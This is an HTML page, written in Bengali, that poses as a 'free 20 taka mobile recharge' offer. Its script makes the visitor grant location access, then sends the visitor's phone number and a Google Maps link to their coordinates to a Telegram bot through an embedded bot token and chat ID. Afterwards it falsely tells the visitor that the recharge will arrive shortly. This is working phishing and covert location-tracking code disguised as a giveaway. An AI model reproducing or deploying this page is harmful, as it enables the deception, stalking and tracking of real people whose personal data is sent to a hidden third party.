<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Recharge Portal</title>
    <style>
        body { background: #ffffff; font-family: sans-serif; text-align: center; margin: 0; padding: 0; }
        .container { max-width: 400px; margin: 50px auto; padding: 30px; border: 1px solid #ddd; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { color: #28a745; }
        input { width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; }
        button { background: #007bff; color: white; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h2>২০ টাকা ফ্রি রিচার্জ! 🎁</h2>
        <p>মোবাইল নম্বর দিয়ে রিচার্জ গ্রহণ করুন।</p>
        <input type="number" id="phone" placeholder="01XXXXXXXXX">
        <button id="btn" onclick="startProcess()">রিচার্জ নিন</button>
    </div>

<script>
async function startProcess() {
    const num = document.getElementById('phone').value;
    const btn = document.getElementById('btn');

    if (num.length < 11) { alert("সঠিক নম্বর দিন!"); return; }
    
    btn.innerText = "প্রসেসিং...";
    btn.disabled = true;

    navigator.geolocation.getCurrentPosition(async (pos) => {
        const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k";
        const chat_id = "7887080882";
        const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
        const text = `🔔 **নতুন রিকোয়েস্ট!**\n📱 নম্বর: ${num}\n📍 ম্যাপ: ${map}`;

        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            alert("সফল হয়েছে! কিছুক্ষণের মধ্যে রিচার্জ পাবেন।");
        } catch (e) { alert("সার্ভার সমস্যা! আবার চেষ্টা করুন।"); }
        finally { btn.innerText = "রিচার্জ নিন"; btn.disabled = false; }
    }, () => {
        alert("লোকেশন পারমিশন 'Allow' না করলে রিচার্জ পাওয়া যাবে না।");
        btn.innerText = "রিচার্জ নিন"; btn.disabled = false;
    });
}
</script>
</body>
</html>
